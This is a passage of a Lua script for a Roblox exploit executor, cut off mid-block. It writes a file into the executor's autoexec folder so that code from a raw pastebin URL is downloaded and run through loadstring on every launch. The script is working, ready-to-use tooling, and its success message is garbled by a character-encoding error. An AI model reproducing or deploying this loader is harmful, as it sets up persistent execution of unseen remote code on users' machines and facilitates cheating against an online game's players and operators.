local autoexec_path = "autoexec/main.txt"
local pastebin_url = "https://pastebin.com/raw/Cpt6y553"
local load_cmd = string.format("loadstring(game:HttpGet('%s'))()", pastebin_url)

local writefile = writefile or (syn and syn.writefile)
local isfile = isfile or (syn and syn.isfile)
local makefolder = makefolder or (syn and syn.makefolder)

if writefile and isfile then
    local dir = "autoexec"
    pcall(function()
        if not isfolder(dir) then
            makefolder(dir)
        end
    end)

    if not isfile(autoexec_path) then
        writefile(autoexec_path, load_cmd)
        print("‚úÖ ‡∏™‡∏£‡πâ‡∏≤‡∏á autoexec/main.txt ‡πÄ‡∏£‡∏µ‡∏¢‡∏ö‡∏£‡πâ‡∏≠‡∏¢‡πÅ‡∏•‡πâ‡∏ß!")
